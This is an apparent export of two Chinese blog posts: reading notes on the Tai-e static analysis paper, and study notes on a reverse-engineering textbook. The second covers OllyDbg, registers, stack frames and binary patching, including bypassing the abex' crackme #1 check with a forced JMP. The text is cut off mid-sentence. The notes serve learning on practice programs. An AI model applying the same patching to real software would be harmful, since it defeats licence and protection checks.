[{"id":"e225c813c8f4b0b48846cd97578ebb48","title":"Tai-e-Static-Analysis-Framework-OOPSLA'23","content":"引言\n这篇论文是我看谭老师课题组的第二篇文章，因为对于静态分析一直停留在理论，想着要看看代码，自己试试\n\nABSTRACT静态分析在Bug detection、安全分析、程序解释、优化等方面已经非常成熟。\n静态分析在IR生成、confrol flow graph、control flow graph构建、指针和别名分析的计算等方面都有应用。\n作者设计这个静态分析框架遵循HGDC的原则(Harnessing the Good Designs of Classics)：\n\nfor each crucial component of a static analysis framework, we compare the design choices made for it (possibly) by different classic frameworks such as Soot, Wala, Doop, SpotBugs and Checker\nchoose arguably a more appropriate one; but if none is good enough, we then propose a better design\n\n1 Introduction对于设计一个静态分析的框架来说，重要的是平衡simplicity、usability、effciency。\n我们缺乏一个systematic view去检查静态分析框架的质量，从依赖这些框架去创建新的分析的开发人员来说。\n作者讨论了对于Java静态分析框架一些关键组件的trade-off：\n\nProgram Abstraction：需要一个抽象的模型，去取代所有各种静态分析中的元素\nFundamental Analysis：它应该支持基本的facilities，允许分析开发人员使用分析友好的结构，使用control flow 和 call graph去实现经典的graph-based algorithms\nNew Analysis Development：应该提供一种机制，开发和分析 new analysis，包括bug detectors security analyzers客户端，以及像异常和反射分析等。(最后一节课里的内容)\nMultiple Analysis：它应该提供一个标准化的方法来管理多个分析\n\ndoop、SpootBugs、FindBugs、Checker\n本文的贡献：\n\nTai-e是一个 usage-friendly IR对于开发指针分析来说\nTai-e是一个高效的指针分析系统，很容易用它创建新的指针分析算法\nTai-e也提供了一个插件，用于&#x3D;&#x3D;taint analysis和exception analysis&#x3D;&#x3D;\n\n作者列举了一些人对Tai-e框架的使用反馈。\n2 Program Abstraction静态分析框架需要提供程序的abstraction model,包括IR，type system， class  hierachy等。\nSoot和Wala都有特殊的IR，Tai-e的IR受到了这两个框架的启发而来的。\n\n它可以implement more concise analysis\nbetter understand  intents of IR\n\ntai-e是developer-friendliness，从以下几个方面：\n\n和soot相比，Tai-e区分了不同类型的assign statement\n对于Api的设计，使用了具体的return type对于expression retrival,避免使用integer进行索引去represent variables，这和Soot Wala不一样\n程序元素的组织和可访问性例如values tyoes namse，不像wala，Tai-e集中所有变量相关的信息到一个single interface，没有把他们分到不同的interface。\n\n由于(1)和（2）,Tai-e能让Developers写更简洁的代码。避免不必要的条件检查，在写各种变量和表达式时，进行向下转换。\n(3)可以让开发者更容易了解Tai-e的功能，\n用下面的例子来说迷宫上述的设计。\n1. 对于Soot\nSoot把内部所有带有 &#x3D; 操作符的语句表示为AssignStmt，不区分具体的类型，到底是load store new unary binary statement。但是wala和Tai-e区分。这就可能引起类型检查。\n\n\n这里line 2的Declared type 是AssignStmt，AssignStmt是Soot的类结构中代表binary statement 的 lowest-level interface\n我理解这里的Low就是最底层的接口，也就是它是一个很大的范围，像object一样，所以就需要类型检查，因为它太大了\n\n\n\nSoot总是返回Value(the highest-level interface in the class hierarchy)去代表数据，因此需要类型转换去决定数据的具体类型。\n\n\n已知一个binary statement的左操作数是local variable\n但是soot返回的是Value，这就需要再转成Local\n\n2. Wala\nWala没有上面的问题，它采用不同的策略去代表local variables。\n使用int-index的方式。\n\ngetUse会返回一个int值，它作为一个索引去访问操作数的信息。\n之后在这个Symbol表中，用这个索引去获取值\n\n\n\n这种的缺点就是不直接，当变量的信息多的时候，就很困难。\n3. Tai-e\n避免了上述提到的所有问题，因为程序经常会有很多不同的statement和expressions，用Tai-e更方便。\n此外，对于指针分析，Tai-e把每个变量v和它相关的statement关联起来，一旦v的值改变了，开发者可以直接通过IR获得所有的相关的 statement。\n3 Fundamental Analysis静态分析是对于抽象的数据是如何沿着程序的控制结构流动的，根据程序的语义和运行时环境。\n一个静态分析的框架应该提供基本的产生控制结构的能力，像control flow and call graph\n此外，需要一个指针分析去计算程序中指针相关的变量的可能的值\n3.1 Pointer AnalysisSoot提供了一个context-insensitivity的指针分析系统，Spark，这个运行非常快。\nWala实现了一个context-sensitivity的指针分析系统。\nDoop是另一个指针分析框架，is full of clever and useful design\n不像Soot，wala和Tai-e是imperative，因为是用Java实现的\nDoop是Declative，是用Datalog实现的，他被认为是一个主流的平台去实现和比较指针分析算法。\n对于Java来说，设计一个指针分析系统，需要考虑下面这些key points：\n\n\n指针相关的信息如何表示，这也是指针分析算法的核心\n一个context manager，处理上下文敏感问题\nHeap manager，处理heap object\n解决指针相关信息的传播问题\n\nRepresentation of Points-to Information\n指针分析需要一个统一的结构去代表和每个变量相关的指针集\nSpark和Wala都采用一种混合的方式\n当set的尺寸小于某些值时，使用array去存储指向的对象\n否则，当set的尺寸大于某些值时，用一个bit  set去代表指针集\n\n\nTai-e也用这种方式\n\n\n&#x3D;&#x3D;这里dragon之前给我讲的那个zpoline是啥来着？？&#x3D;&#x3D;\n但是他改进了，上图左边的是spark wala采用的方式，就用0-4096来设置，但是有很多空间浪费了。\n作者的方式是右图，采取了类似于 virtual memory的方式，用sparse bit set(稀疏点集)去代表指针集。\n16个Integer，每个是32bits，指向16个256的set，总共是4096。\n但是因为这里就用了4个object，所以总共就是256x2 + 16 x 32，\n&#x3D;&#x3D;但是这里为什么是32bits呢？&#x3D;&#x3D;\n实际上，作者用two-level的page table去节约更多的空间\n\ntable的size根据对象的指针集动态决定\n与常规的bit set比，对于context-sensitivity的指针分析，节省了很多内存。\n许多对于C language的work，设计了 new bit sets，这也可以同样应用于java\nDoop 是Declartive，它的指向集合是开发人员无法访问的.\n&#x3D;&#x3D;(就像数据库一样,是受保护的??)&#x3D;&#x3D;\n\nContext Manager对于各种上下文敏感 variants 有不同的context length method call heap object,因此需要一种方法来管理.\nQ1:现有的指针分析框架对于上下文敏感的问题\n\nSoot没有上下文敏感,\nSprak是C.I.\nPaddle是一个基于BDD的C.S.指针分析,它的效率不如Doop\nDoop是有许多rules来实现C.S.,但是对于不同的C.S.分析,需要写不同的实现,让代码很冗余\n\nQ2:Tai-e的C.S.\n\nTai-e是imperative,对于同样的C.S.分析,它把context length作为输入的参数\nWala只提供了context management对于方法调用,它的heap context直接继承于方法的上下文\n和Wala相比,Tai-e提供了更灵活的context management,可以具体的定义上下文,是 method call还是 heap object,比如可以给method call 用3-call-site,给heap object 用1-call-site\n\nQ3:selective context sensitivity\n\n之前的论文也提到,他是一个很state-of-the-art的技术\n目前现有的selective C.S.都已经被Tai-e实现了\n\n3.2 Control&#x2F;Data Flow Analysis对于data flow analysis,作者列举了不同的框架,可以简化control&#x2F;flow analysis分析的实现\nControl Flow Analysis\n它的主要任务是构建CFG,但是用不同的框架,效率不一样\nEdge categories\n\nSoot Wala  Checker不对边进行分类,例如 IF_true IF_false caugt_exception\n如果分类了,会对 path  sensitive and branch-correlated analysis  exceptionspecic handling 有很好的处理\n\n\nTai-e和SpotBugs对边进行分类,但是Tai-e提供了额外的有用的边信息.\nlabel  switch edge用case value\n给exception edge加上具体的异常类型\n\n\n开发者也能在Soot Wala中获得边的信息,通过解析相关的node,但是这不方便\nCheck不对边进行分类,但是对CFG node进行分类,例如 ConditionalBlock ExceptionBlock,可以通过API从block中获得edge 的信息\n\nException handling\n对于Java来说,一个关键的影响构建CFG的有效性的因素是如何解决Java的一场,被认为是control flow analysis中不完整的一个关键因素\n有显式和隐式异常, 如果catch 到的异常类型匹配,就通过throw statement抛出相应的异常,之后由JVM隐式执行.\n一个完整的CFG应该考虑异常,但是很多隐式的异常和正常的flow是没有交互的,因此考虑他们可能会降低分析的精度.\n和Wala SpotBugs Check不同,Tai-e Soot区分控制流的显式和隐式异常,允许用户决定在CFG上添加哪个.\nTai-e也实现了最先进的异常分析,比其他的解决异常的精度更高,提供一个选项在构建CFG的时候.\ndata flow analysis\n为了实现数据流分析,开发者可以使用数据流分析系统提供的接口,去做一些具体的操作,让这个分析满足monotonic 和safe0approximated\n\ndata facts抽象和初始化\n\n对于不同的statement的transfer function \n\n对于Merge的数据,是join 或者meet的操作\n\n\ndata facts initialization\n\nSoot Wala不允许initialize data facts,他们在solver中实现了相关的API,因此每次对于一个new analysis需要不同的initialization,都必须实现一个new solver去实现API\n一个优秀的设计应该只有一个solver去驱动多个数据流分析,以便开发者只需要集中于analysis的实现,而不需要集中于solver的实现\n\nEdge transfer functions\nSpotBugs Wala. Soot Check 都不显示的支持edge transfer function\nEdge Transfer function 和 node transfer function不同,对于一个node的后继节点,他们沿着边把data facts发送给各种后继节点,这些node使用分支信息(当expressions E是有效的,fact D就被传播);来做更有效的analysis.\n当edge的transfer function里面没有内容的时候,就把source node 的Out fact当成target node 的In fact,这也就是常的Node transfer function的分析.\n但是在Soot中,为了利用branch information,开发者需要extend一个特殊的分析 BranchedFlowAnalysis并且实现edges 和nodes的相关逻辑在node的transfer function中,这很不方便且冗余.\nChecker不直接支持edge transfer function,它把node transfer的结果分成不同的类,例如then或者else分支.Solve可以传播then的结果给相应的successor沿着then branch,让开发者可以有相同的功能像edge transfer function一样.\n这可能需要处理edge相关的facts在node transfer function中,耦合了node 和 edge transfer function的逻辑\nChecker的标准和其他的框架各不一样,它加强了Java的 type system,通过让开发者给types写qualifiers(本质上是Java的注解,就是@Autofired的这种),通过type qualifier inference来进行分析.这种机制事实上是很有效的,未来在Tai-e中可能用annotations去辅助静态分析&#x2F;\n&#x3D;&#x3D;来自gpt:&#x3D;&#x3D;\n类型修饰符\n在某些编程语言中，类型修饰符可能需要显式地指定，以明确表达变量或参数的特性。然而，对于某些情况，编译器可以根据上下文自动推断出适当的类型修饰符，而无需显式指定.\n具体来说，类型修饰符推断可以根据以下情况进行推断：\n\n变量初始化：当变量被初始化时，编译器可以根据右侧表达式的类型推断出变量的类型修饰符。\n方法调用：当调用带有类型修饰符参数的方法时，编译器可以推断出传递给方法的参数的类型修饰符。\n返回值推断：当方法具有明确的返回表达式时，编译器可以根据返回表达式的类型推断出方法的返回值的类型修饰符。\n\n（type qualifier inference）可以优化程序的主要原因是它可以减少代码中显式类型修饰符的冗余，从而简化代码并提高可读性。\n类型修饰符推断如何优化程序的一些方面：\n\n减少冗余的代码：通过自动推断类型修饰符，开发人员不需要显式地为每个变量、参数或返回值指定类型修饰符。这减少了冗余的类型修饰符声明，使代码更加简洁和清晰。\n提高可读性：通过省略显式的类型修饰符，代码变得更加简洁和易读。开发人员可以专注于核心逻辑而不是类型修饰符的繁杂声明，使代码更易于理解和维护。\n提升开发效率：类型修饰符推断减少了开发人员编写和维护代码中的冗余类型修饰符的工作量。这样，开发人员可以更快速地编写代码，减少了错误的可能性，并提高了开发效率。\n更好的可扩展性：类型修饰符推断使代码更具灵活性和可扩展性。当引入新的类型修饰符或修改现有的类型修饰符时，开发人员不需要手动更改整个代码库中的每个类型修饰符声明。编译器可以根据上下文自动推断类型修饰符，从而使代码库的维护更加容易。\n\n4 New Analysis Development一个静态分析框架应该提供整合new analysis的能力，从intraprocedural 到interprocedural\n这里介绍了指针分析过程中可能用到的类，像reflection analysis和exception analysis的基本原理，Bug finders和security analyzers client\n对于Doop\n这里省略\n对于Wala\nwala提供一种机制在添加new analysis时，和pointer analysis进行交互\n\n首先，devlopers需要实现一个ContextSelector 的接口，来指定相关的call site，\n在call site处，new analysis 基于pointed-to results 进行model\n\n例如：分析reflective call v = c newInstance()\n\ndevelopers encode ContextSelector to identify this call site and retrieve the Class objects,CO，\n\n就是找到对应的类，和call site\n\n\n根据pointed-to results，c指向co \n\ndevelopers 需要实现 ContextInterpreter，生成fictitious but effect-equivalent IRS(e.g., v &#x3D; new T(); v.&lt; init &gt;()) according to the resolved types of CO (say T)\n\n因为newInstance本身也是在new一个对象，分析的时候要把它当成new一个对象\n根据之前CO所属的类，去分配一个对象\n\n\nThen these generated IRs are fed back to pointer analysis to continue the resolution for this reective call.\n\n\n上述就是一个Java反射创建对象的过程，正常我们也是这样理解的，把我们理解的转换成IR，并反馈给pointer analysis.\n上面的scheme很容易理解，但是对于Pointer analysis来说，有一些限制\n(这部分先不看了，我觉得主要还是理解代码)\ntai-e引进了一个analysis plugin system\n\n\n\n对于call site 1来说，\n\nedge的source就是call site1，target是目标方法source。\n进入if，如果目标放是source，创建一个污点对象o，\n然后更新这个solver，call site的 left-hand side variable，也就是s1，指向一个五点对象o\n\n对于call site2来说，\n\nedge的source是call site2，target是目标方法concat。\n\n此时的concat是一个transfer，在这行Transfer中，污点对象从参数s1，流到了s3中\n\n对于tansfer，应该把from指向的污点对象，也加到to的指针集中。也就是把o也加到s2的指针集中\n\n现在s3也指向了污点对象，transfer from s1\n\n这个transfer relatin也被添加到  transferVars中，用于记录来自transfer metho的污点相关的数据流edge\n\n\nOnNewPointesToSet\n\n这个就很好理解了，相当于污点数据的传播，把污点数据传给其他边。\n\nOnFinish\n\n当达到fixed point时，solver就会调用Onfinish\n对于每个sink method和他的敏感参数param_i,onFinish识别他的call site cs，并且检查是否有污点数据流到param_i，如果有，就报告污点信息。\n\n5 Multiple Analysis management在很多情况下，一个分析依赖于其他分析的结果。\n因此：\n\n如何配置一个analysis 和它的dependencies？\n如何保存一个分析的结果并在其他分析中访问？\n\nConfigure Analysis and its Dependencies\n可以通过配置文件来记录所有新的分析。\nStore&#x2F;Access Analysis Results\n6 Evaluation\n总结\n这篇文章看下来，目前还有很多不懂的地方，因为我没有真的用过Soot、Wala\n下来要自己尝试一下实现的代码，同时跑一下上一篇论文的实验\n感觉静态分析很难，自己只是刚刚入门。\n\n","slug":"Tai-e-Static-Analysis-Framework-OOPSLA-23","date":"2023-10-17T01:44:12.000Z","categories_index":"","tags_index":"Program Analysis,论文","author_index":"XyM4ster"},{"id":"a3921abd6a7c73ab6b942ac2f92b0322","title":"re-engineer-core-principle","content":"引言看《逆向工程核心原理》这本书\n\n好久之前看了这本书的一部分，现在决定重新学一下。\n感觉逆向十分重要，且我的hxd wd-2711(https://wd-2711.tech/)一直在学逆向，在他的感染下，我也开始学。\n\n0x01 关于逆向工程\n静态分析法：并不执行代码，观察代码文件的外部特征\n\n0x02 逆向分析HelloWorld2.2 调试Helloworld.exe\n首先用ollydbg打开helloworld.exe\n\n\n\n2.2.3 入口点\n\n这里是当前程序停止的地方，就是入口点\n\n2.2.4 跟踪函数OllyDbg的基本指令\n\n\n这里是visual C++的启动函数\n这里就是跟着书上一步一步调试，直到找到main函数\n\n\n2.3 熟悉调试器2.3.1 调试器指令\n\n\n2.3.2 设置大本营其实也就相当于设置断点\nGoto 命令\n\nctrl + G设置地址为40104F\n执行F4就会让程序运行到该处\n\n设置断点\n\nF2设置断点\n\nOllydbu菜单栏中，选择View-Breakpoints选项，快捷键alt+B，打开Breakpoints对话框\n\n\n注释\n\n按键盘上的 ;  可以添加注释\n鼠标右键，可以选择search for-User defined comment\n\n\n标签(label)\n\n按键盘上的 ：  可以添加标签\n标签也可以按照上面的方法检索\n\n2.4 快速查找指定的代码方法1：代码执行法\n\n就是从头到尾执行代码，那可以根据程序运行的结果来判断是否找到了指定的代码\n\n方法2：字符串检索法\nVC++中默认字符串使用Unicode码表示，并且处理字符串中的API函数也都变更为Unicode系列函数。\n\n\n鼠标右键-Search for- All referenced text string，可以看到所有代码中引用的字符串\n\n\n\n这里可以直接定位hello world的位置\n\n\n\n接着在数据窗口，用goto 定位4092a0，\n找到helloworld。\n\n\n这里的4092A0和上面代码区域的401xxx不一样，HelloWorld.exe进程中，409XXX地址空间被用来保存程序使用的数据。\n方法3：API检索法(1）\n鼠标右键-Search for-All intermodular calls\nOllydbg也可以摘录出程序调用的API函数列表\n\n我们可以根据程序的功能来大致判断他用的是哪些API,像上面这个弹出窗口的功能，大致是调用了user32.MessageBoxW()API\n\n方法4：API检索法(2)\n鼠标右键-Search for-Name in all calls\nOllydbg也不能列出所有的API函数列表，如果使用压缩器&#x2F;保护器对文件压缩后，Ollydbg就无法提取了。\n\n这就需要向dll代码库中添加断点。\nAPI是操作系统对用户提供的函数，实现在C:\\Windows\\systems32文件夹中的*.dll文件。\n也就是我们编写的应用程序执行某种操作时，必须用os提供的API向os发送请求，此时与API对应的系统DLL文件就会被加载到应用程序的进程内存中。\nalt + M打开内存映射窗口，这里可以看到HelloWorld的进程内存，底部的是User32库\n\n\n打开name in all moudles，这是.dll文件中提供的所有api，找到messageboxw export&#x2F;\n\n\n在40100e处调用了messageBoxW，执行完毕会返回到401014地址\n2.5 使用打补丁修改helloworld字符串2.5.2修改字符串的两种方法方法1：直接修改字符串缓冲区\n\n因为helloworld字符串是放在409a20这个地址处的，那我就直接在dump窗口执行Go to命令，进入字符串缓冲区，按ctrl + E打开编辑窗口\nunicode编码中用两个字节表示一个罗马字母，Unicode字符串必须以null结束，占据2个字节(添加null时不能直接在unicode文本框中进行，要在Hex中添加)\n\n\n\n此时按F9继续执行程序，发现输出已经变了\n\n\n\n\n但是目前的更改只是在当前调试中的更改，如果想永久更改，需要选中字符串，右键copy to executable file，在弹窗的窗口中，右键选择save file\n\n\n方法2：在其他内存区域新建字符串并传递给消息函数\n\n\n\n\n\n\n提示\n应用程序被加载到内存时有一个最小的内存分配大小，一般为1000。 即使程序运行时只占用100 内存，它被加载到内存时仍然会分到1000 左右的内存，这些内存一部 分被程序占用，其余部分为空余区域，全部被填充为NULL。\n\n\n\n根据helloworld的地址是4092a0，向下滑动，发现有Null区域\n在这部分新增字符串‘\n在代码区，按空格修改push的地址\n运行程序，成功更改\n\n\n问题：但是把上面修改完的保存为可执行文件，却并不能正常运行\n\nQ：什么是启动函数\n\n0x03 小端序3.1 字节序大端序：采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位\n小端序：地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒。Inter X86CPU采用小端序\n\n最后一行字母e的ASCII码是0x65，字符串最后以null结尾。\n本书之后默认所有数据都采用小端序存储\n0x04 IA32寄存器寄存器(Register)是CPU内部用来存放数据的一些小型存储区域，它与我们常说的RAM(Random AccessMemory，随机存储器、内存)略有不同。\nCPU访问(Access)RAM中的数据时要经过较长的物理路径，所以花费的时间要长一些。\n而寄存器集成在CPU内部，拥有非常高的读写速度。\n4.2 IA-32寄存器IA-32是inter推出的32位元架构。\n基本程序运行寄存器\n通用寄存器(General Purpose Registers，32位，8个)\n段寄存器(SegmentRegisters，16位，6个)\n程序状态与控制寄存器(Program Status and Control Registers，32位，1个)\n指令指针寄存器(Instruction Pointer，32位，1个)\n\n通用寄存器通用寄存器是一种通用型的寄存器，用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。\nIA-32中每个通用寄存器的大小都是32位，即4个字节。\n\n\n\n\n\n\n\n提示\n在寄存器名称缩略语之前添加字母E(Extended，扩展)，表示该寄存器在 16位 CPU (IA-16) 时就已经存在，并且其大小在 IA-32 下由原 16位扩展为32 位。\n为了实现对低16位的兼容，各寄存器又可以分为高(H: High)、低(L: Low)几个独立寄存器\n\nEAX：32位\nAX：EAX的低16位\nAH：AX的高8位\nAL：AX的低8位\n\n若想全部使用4个字节(32位)，则使用 EAX;若只想使用2个字节(16位)，只要使用EAX的低16位部分AX就可以了。AX又分为高8位的AH与低8位的AL两个独立的寄存器。\n\n\n\n\nEAX：(针对操作数和结果数据的)累加器\nEBX：(DS段中的数据指针)基址寄存器\nECX：(字符串和循环操作的)计数器\nEDX：(IO指针)数据寄存器\n\n以上4个寄存器主要用在算术运算(ADD、SUB、XOR、OR等)指中，常常用来保存常量与变量的值。\n某些汇编指令(MUL、DIV、LODS等)直接用来操作特定寄存器，执行这些命令后，仅改变特定寄存器中的值。此外，ECX与EAX也可以用于特殊用途。\n\n循环命令 (LOOP) 中，ECX用来循环计数 (loop count)，每执行一次循环，ECX都会减1。\nEAX一般用在函数返回值中，所有Win 32 API函数都会先把返回值保存到EAX再返回。\n\n\n\n\n\n\n\n提示\n编写Windows汇编程序时，Win32 ApI函数内部会使用ECX与EDX，所以当这两个寄存器中有值时，应该先保存一下。\n\n\n通用寄存器中的其他几个寄存器名称：\n\nEBP：(SS段中栈内数据指针)扩展基址指针寄存器\nESI：(字符串操作源指针) 源变址寄存器口\nEDI：(字符串操作目标指针)目的变址寄存器\nESP：(SS段中栈指针)栈指针寄存器\n\n以上4个寄存器主要用作保存内存地址的指针。\n\nESP指示栈区域的栈顶地址，某些指令(PUSH、POP、CALL、RET)可以直接用来操作。ESP(栈区域管理是程序中相当重要的部分，请不要把ESP用作其他用途)。\nEBP表示栈区域的基地址，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃。\nESI和EDI与特定指令(LODS、STOS、REP、MOVS等)一起使用，主要用于大存复制。\n\n段寄存器IA-32的保护模式中，段是一种内存保护技术，它把内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等，以保护内存。此外，它还同分页技术(Paging)一起用于将虚拟内存变更为实际物理内存。段内存记录在SDT(Segment Descriptor Table，段描述符表)中，而段寄存器就持有这些SDT的索引 (index)。\n下图描述了保护模式下的内存分段模型。段寄存器总共由6种寄存器组成，分别为CS、SS、DS、ES、FS、GS，每个寄存器的大小为16位，即2个字节。另外，每个段寄存器指向的段描述符(Segment Descriptor)与虚拟内存结合，形成一个线性地址(Linear Address)借助分页技术，线性地址最终被转换为实际的物理地址(PhysicalAddress)。\n\nCS：Code Segment，代码段寄存器\nSS：Stack Segment,栈段寄存器\nDS：Data Segment，数据段寄存器\nES：Extra ( Data)Segment，附加(数据)段寄存器\nFS：Data Segment，数据段寄存器\nGS：Data Segment，数据段寄存器\n\n顾名思义，CS寄存器用于存放应用程序码所在段的段基址，SS寄存器用于存放栈段的段基址，DS寄存器用于存放数据段的段基址。ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址，如图4-3所示。\n\n程序调试中会经常用到FS寄存器，它用于计算SEH(Structured Exception Handler，结构化异常处理机制)，TEB(Thread Environment Block，线程环境块)，PEB (Process Environment Block进程环境块)等地址。\n程序状态与控制寄存器\nEFLAGS：Flag Register 标志寄存器\n\nIA-32中标志寄存器的名称为EFLAGS，其大小为4个字节 ( 32位，由原来的16位FLAGS寄存器扩展而来。）如图4-4所示，EFLAGS寄存器的每位都有意义，每位的值或为1或为0，代表On&#x2F;Off或True&#x2F;False。其中有些位由系统直接设定，有些位则根据程序命令的执行结果设置。如上所述，EFLAGS寄存器共有32个位元，掌握每位的含义是相当困难的。学习代码逆向分析技术的初级阶段，只要掌握3个与程序调试相关的标志即可，分别为\n\nZF ( Zero Flag，零标志)：若运算结果为0,其值为1。否则为0.\nOF(Overflow Flag，溢出标志)：有符号整数 (signedinteger)溢出时，OF值被置为1。此外，MSB(Most Significant Bit.最高有效位)改变时，其值也被设为1。\nCF(Carry Flag，进位标志)：无符号整数(unsignedinteger)溢出时，其值也被置为1。\n\n\n\n\n\n\n\n提示\n以上3个标志之所以重要，是因为在某些汇编指令，特别是 Jcc(条件跳转) 指令中要检查这3个标志的值，并根据它们的值决定是否执行某个动作。\n\n\n\n指令指针寄存器\nEIP: Instruction Pointer，指令指针寄存器\n\n\n指令指针寄存器保存着CPU要执行的指令地址，其大小为32位 (4个字节，由原16位IP寄存器扩展而来。\n程序运行时，CPU会读取EIP中一条指令的地址，传送指令到指令缓冲区后，EIP寄存器的值自动增加，增加的大小即是读取指令的字节大小。\n这样，CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。\n与通用寄存器不同，我们不能直接修改EIP的值，只能通过其他指令间接修改，这些特定指令包括JMP、Jcc、CALL、RET。此外，我们还可以通过中断或异常来修改EIP的值。\n\n0x05 栈\n栈内存在进程中的作用如下:\n​\t(1)暂时保存函数内的局部变量\n​\t(2)调用函数时传递参数。\n​\t(3)保存函数返回后的地址\n执行push指令后，ESP由16ff78变成了19ff74,把100压入栈，执行Pop后，又恢复为原来的状态。\n\n\n\n0x06 分析abex’ crackme#1可以看到整个代码中就有call MessageboxBoxA，是因为他是用汇编语言编写的可执行文件，反编译之后直接变为反汇编代码。\n而使用VC++等开发工具写的代码，会有一部分启动函数是由编译器添加的，这在反编译之后就会非常复杂。\n汇编指令\n6.2 破解\n\n把这个命令直接改成JMP 40103D，直接跳转\n\n\n6.3 将参数压入栈函数调用时的顺序与参数压入栈的顺序相反。\n\n这是因为在取参数时候，最顶上的会被取出来，那么第一个取出来的就是NULL，刚好和参数的顺序一样。\n0x07 栈帧7.1 栈帧\n栈帧就是利用EBP(栈指针，请注意不是ESP)寄存器访问栈内局部变量、参数函数返回地址等的手段。\nESP寄存器承担着栈顶指针的作用，而EBP寄存器则负责行使栈帧指针的职能。\n程序运行中，ESP寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以ESP值为基准编写程序会十分困难，并且也很难使CPU引用到准确的地址。\n所以，调用某函数时，先要把用作基准点(函数起始地址的ESP值保存到EBP.并维持在函数内部。这样，无论ESP的值如何变化，以EBP的值为基准(base)能够安全访问到\n\n7.2 调试Stackframe.exe7.2.1 StackFrame.cpp\n7.2.2 开始执行main函数&amp;生成栈帧main函数的起始地址，ESP的值是19FF30，401250保存在ESP中，也就是栈中，是main函数的返回地址。\n\n执行Push EBP，保存EBP的值。\n\n把ESP的值赋值给EBP,因为此时ESP是栈底指针，后续esp的值要一直改变，可以用ebp的值访问局部变量。\n\n右键，address,relative to ebp，此时可以看到Esp和EBP相同， 都是19ff2c，此处存着是最开始(push ebp)的值，19ff74，401250是之前就push到栈里的函数返回地址。\n\n7.2.3 设置局部变量long a = 1, b=2;\n首先，esp-8是开辟了8字节的空间，因为long数据每个都是4字节。\n\n接着是两条赋值语句，这个DWORD是个类型转换，SS是Stack Segment的缩写，表示栈段。\n\n\n\n执行完之后，1和2就被添加到栈里。\n\n7.2.4 add()函数参数传递与调用add(a,b)\n首先会把调用add所需要的参数压入栈中，先放b再放a，接着调用add函数。这里看出之前把1,2压入栈中是为了通过ebp获取局部变量，赋值给函数调用的参数。\n\n\n返回地址\n执行call命令进入被调用的函数之前，CPU会先把函数的返回地址压入栈中，用作函数执行完之后的返回地址。\n也就是会把，call的下一条指令的地址401041放到栈中。\n\n\n7.2.5 开始执行add()函数&amp;生成栈帧long add(long a,long b)&#123; &#125;\n函数开始执行时，栈中会单独生成与其对应的栈帧。\n正如前面执行main函数时，会保存main函数栈帧的ebp的地址一样，这里也会先保存ebp的值。\n\n然后把esp的值给ebp。\n\n\n7.2.6 设置add()函数的局部变量(x,y)long x = a, y = b\n这四条语句是开启8字节的空间给x,y，再从栈里取出原来存储的a b，把值赋给x y。\n&#x3D;&#x3D;这里发现函数内部的变量也是掀开偶空间，然后从上向下赋值，和栈增长的方法是相反的&#x3D;&#x3D;\n\n\n7.2.7 ADD运算return (x + y)\n首先把ebp-8也就是x&#x3D;1的值给EAX，然后让EAX和EBP-4(也就是x&#x3D;2)的值相加，最后把结果3赋值给EAX，并返回。\n\n\n7.2.8 删除函数add()的栈帧&amp;函数执行完毕对于这条命令，它会把ebp的值给esp，执行完之后，执行完上面的命令后，地址401003处的 SUB ESP8命令就会失效，即函数add的2个局部变量x、y不再有效。\n\n\n执行pop ebp，之前把ebp的值放入栈中，现在把它Pop出来，让ebp恢复为之前的值19ff2c。\n\n\nRETN\n执行return语句，函数返回到调用的下一条地址\n\n7.2.9 从栈中删除函数add()的参数(整理栈)这里执行esp+8，因为add函数的参数  a  b不再需要了，所以就把他们去掉，此时栈内的情况如下。\n\n\n\n\n\n\n\n\n提示\n被调函数执行完毕后，函数的调用者(Caller)负责清理存储在栈中的参数，这种方式称为 cdecl方式;反之，被调用者(Callee)负责清理保存在栈中的参数，这种方式称为stdcall方式。这些函数调用规则统称为调用约定(Calling Convention)，这在程序开发与分析中是一个非常重要的概念，第 10章将进一步讲解相关内容。\n\n\n7.2.10 调用printf()函数printf(&quot;%d\\n&quot;,add(a,b))这也是个函数，之前计算的结果存储在EAX中，所以先把EAX放到栈内，再把%d放入栈内，执行add函数。\n\n\nadd ESP 8\n执行结束后，去掉刚才添加的两个参数，黑色表示ESP的位置\n\n7.2.11 设置返回值return 0\nXOR命令用来进行Exclusive OR bit(异或)运算，其特点为“2个相同的值进行XOR运算，结果为0”。XOR命令比MOV EAX 0命令执行速度快，常用于寄存器的初始化操作。\n\n\n\n\n\n\n提示\n相同的值连续执行两次变回原值，这个特征被用于编码和解码。\n\n\n\n7.2.12 删除栈帧&amp;main函数终止和前面一样，就是把EBP的值给ESP，相当于直接扔掉当前函数(main函数)内定义的局部变量，如下图的红色箭头所示。\n接着pop ebp，让ebp回到原来的值\n\n\n最后执行return ，整个流程结束。\n7.3 设置Ollydbg选项7.3.1 Disasm选项alt + O,选择Disasm\n分在Debugging options对话框中选择Disasm选项卡后，分别点击“Show default segments“Always show size ofmemory operands”左侧的复选框，取消选择。观察代码窗口可以发现，原来代码中显示的默认段与内存大小都不再显示了。\n7.3.2 Analysis 1选项选择Analysis1选项卡，点击“SHOWAPGsand LOCALsin procedures”左侧的复选框，启用该选项。局部变量、参数分别表示成了LOCAL.1、ARG.1的形显示。\nollyDbg会直接分析函数为栈帧，然后把局部变量的个数、参数的个数等显示在代码窗口。\n\n总结Q1：ESP和EBP指针\n\nESP就是栈顶指针，会根据Push pop命令，进行相应的移动\nEBP指针很重要，用来管理局部变量，参数，返回地址等。\n\nQ2：整个程序执行过程中栈的变化\n\n\n首先执行main函数，push main函数的返回地址\npush ebp，并把esp的值给ebp\n开辟8字节的空间，先Push a &#x3D; 1，再push b&#x3D;2\n执行add函数\n为add函数开辟8字节的空间，先push b，再push a\npush函数的返回地址，也就是下一条指令的地址\npush ebp，把esp的值给ebp\n接着再开辟8字节的空间，此时也是先push b 再push a\n利用ebp 取出x y 的值，计算x + y的结果，给EAX寄存器\n\n\n删除add函数的栈帧，也就是让add函数内定义的变量失效\n把ebp的值赋给esp\npop ebp，让ebp恢复成可以访问main函数的地址\n\n\n删除add的参数a,b，因为不再用了\n执行printf函数\n先push 